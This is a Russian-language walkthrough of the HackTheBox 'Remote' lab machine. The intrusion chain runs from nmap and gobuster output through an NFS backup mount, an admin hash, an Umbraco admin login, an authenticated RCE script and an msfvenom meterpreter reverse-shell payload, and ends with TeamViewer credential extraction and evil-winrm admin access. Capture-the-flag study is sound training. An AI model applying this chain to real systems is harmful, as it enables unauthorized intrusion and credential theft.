Дисклеймер.  
Все инструменты описанные в данной статье реальны, находятся в свободном доступе и используются специалистами по Информационной Безопасности для проведения тестирования на проникновение информационных систем компаний и предприятий. Автор статьи не занимается взломом и не поощряет подобных действий, все описанное ниже было выполнено на специально подготовленной для этого виртуальной машине.
[[nmap]]

```bash
 Nmap scan report for 10.10.10.180
 Host is up (0.16s latency).
 Not shown: 993 closed ports
 PORT STATE SERVICE VERSION
 21/tcp open ftp Microsoft ftpd
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst:
 |_ SYST: Windows_NT
 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-title: Home - Acme Widgets
 111/tcp open rpcbind 2-4 (RPC #100000)
  | rpcinfo:
 | program version port/proto service
 | 100000 2,3,4 111/tcp rpcbind
 | 100000 2,3,4 111/tcp6 rpcbind
 | 100000 2,3,4 111/udp rpcbind
 | 100000 2,3,4 111/udp6 rpcbind
 | 100003 2,3 2049/udp nfs
 | 100003 2,3 2049/udp6 nfs
 | 100003 2,3,4 2049/tcp nfs
 | 100003 2,3,4 2049/tcp6 nfs
 | 100005 1,2,3 2049/tcp mountd
 | 100005 1,2,3 2049/tcp6 mountd
 | 100005 1,2,3 2049/udp mountd
 | 100005 1,2,3 2049/udp6 mountd
 | 100021 1,2,3,4 2049/tcp nlockmgr
 | 100021 1,2,3,4 2049/tcp6 nlockmgr
 | 100021 1,2,3,4 2049/udp nlockmgr
 | 100021 1,2,3,4 2049/udp6 nlockmgr
 | 100024 1 2049/tcp status
 | 100024 1 2049/tcp6 status
 | 100024 1 2049/udp status
 |_ 100024 1 2049/udp6 status
 135/tcp open msrpc Microsoft Windows RPC
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
 445/tcp open microsoft-ds?
 2049/tcp open mountd 1-3 (RPC #100005)
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Host script results:
 |_clock-skew: 4m56s
 | smb2-security-mode:
 | 2.02:
 |_ Message signing enabled but not required
 | smb2-time:
 | date: 2020-08-03T07:02:12
 |_ start_date: N/A
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Выглядит как жо**, так и есть. на всякий случай проверим 445 на [[ms17-010]] через метасплоит. Не поддается. Дальше сайт, [[gobuster]].
```bash
 /contact (Status: 200)
 /blog (Status: 200)

/products (Status: 200)

/home (Status: 200)

/people (Status: 200)

/Home (Status: 200)

/Products (Status: 200)

/Contact (Status: 200)

/install (Status: 302)

/Blog (Status: 200)

/about-us (Status: 200)

/People (Status: 200)

/INSTALL (Status: 302)

/1112 (Status: 200)

/intranet (Status: 200)

/1117 (Status: 200)

/1114 (Status: 200)

/person (Status: 200)

/1115 (Status: 200)

/1113 (Status: 200)

/1119 (Status: 200)

/1107 (Status: 200)

/1125 (Status: 200)

/1109 (Status: 200)

/1106 (Status: 200)

/1127 (Status: 200)

/1110 (Status: 200)

/1116 (Status: 200)

/1120 (Status: 200)

/1122 (Status: 200)

/1111 (Status: 200)

/1129 (Status: 200)

/1123 (Status: 200)

/1124 (Status: 200)

/1121 (Status: 200)

/1128 (Status: 200)

/1148 (Status: 200)

/1126 (Status: 200)

/1118 (Status: 200)

/1108 (Status: 200)

/Intranet (Status: 200)

/HOME (Status: 200)

/Install (Status: 302)

/About-Us (Status: 200)

/CONTACT (Status: 200)

/001110 (Status: 200)

/001117 (Status: 200)

/001106 (Status: 200)

/001108 (Status: 200)

/001115 (Status: 200)

/001109 (Status: 200)

/01119 (Status: 200)

/001121 (Status: 200)

/001119 (Status: 200)

/001116 (Status: 200)

/001118 (Status: 200)

/001123 (Status: 200)

/001124 (Status: 200)

/001122 (Status: 200)

/01118 (Status: 200)

/001126 (Status: 200)

/001127 (Status: 200)

/PRODUCTS (Status: 200)

/001148 (Status: 200)

/001125 (Status: 200)

/001112 (Status: 200)

/001128 (Status: 200)

/01106 (Status: 200)

/01109 (Status: 200)

/01114 (Status: 200)

/Person (Status: 200)

/PEOPLE (Status: 200)

/01117 (Status: 200)
```
Нда, Хагрид!!!

![Прохождение виртуальной машины Remote/HackTheBox., изображение №1](https://sun9-73.userapi.com/impg/vkYK4zdC7gW-oCyGGMdtCusXQWZ0GeVBS6-iEw/Gpok66Imexk.jpg?size=807x422&quality=96&sign=2295ee26891d8cd4d129b350aa1bf51c&type=album)

так, что теперь, не хочу копаться в этой помойке, да и чувствую я это бесполезно. Стоп. [[FTP]]

Пусто? Да ***, а что есть тогда?
[[mount]]

```bash
 showmount -e 10.10.10.180
```

опа, нашлись бэкапы, надо скачать…

```bash
 mount -t nfs 10.10.10.190:/site_backups /Remote
```

и так, бекап сайта у нас руках

попробуем [[grep]] по слову admin

находим логин и хэш пароля

любым способом крякаем хэш, получаем пару логин пароль

и так, теперь надо понять куда втыкать их, немного походив на сайте натыкаемся на форму входа  

мы внутри админ панели [[umbraco]] функционал сие вещи обширен, но нас интересует загрузка файлов

есть, попробуем сгрузить php? нельзя. Стоп exe в загрузках? Ну ок…  
msfvenom нам в помощь. Но это окей, ладно, надо бы понять как его потом запустить. гуглим… находим скрипт на питоне, очень удобно…  
на всякий случай стоит протестить.

```bash
 python exploit.py -u user -p password -i '10.10.10.190' -c powershell.exe 'ls C:'
```

вышло, видим содержимое диска C

пора собирать полезную нагрузку
[[metasploit#msfvenom]]

```bash
 msfvenom -p windows/meterpreter/reverce_tcp LHOST=<наш ip> LPORT=6675 -f exe >payload.exe
```

есть, запустим **multi/handler** в [[metasploit]] чтобы поймать подключение.

Теперь сгрузим нашу полезную нагрузку через админку

зайдем на страницу с подробной информацией о файле, найдем его местоположение (можно и просто отследить по дате изменения папок)

запустим наш python exploit еще раз  
на диске C видно папку inetpub[[IIS]] погуглив узнаем что это наш веб сервер

дальше wwwroot

ну а дальше и так понятно, по тому пути который мы узнали, ну или в любом случае немного подумав становится понятно, что все что загружено обычно находится в media.

теперь запускаем сгруженый exe

ловим сессию

идем в пользователей

попробуем зайти к админу в гости, увы, но нельзя

сходим в Public получим флаг user.txt

запустим winpeas чтобы облегчить себе задачу

из вывода видно что у нас есть [[TeamViwer]]

окей, идем в папку с ним, посмотрим версию

Версия 7

используем один из модулей [[metasploit]]

**post/windows/gather/credentials/team_viewer_passwords**

получили пароль

чтобы зайти используем [[evil-winrm]]

```bash
evil-winrm -u Administrator -p password -i 10.10.10.180
```

мы админ! Походив по папкам находим root.txt на рабочем столе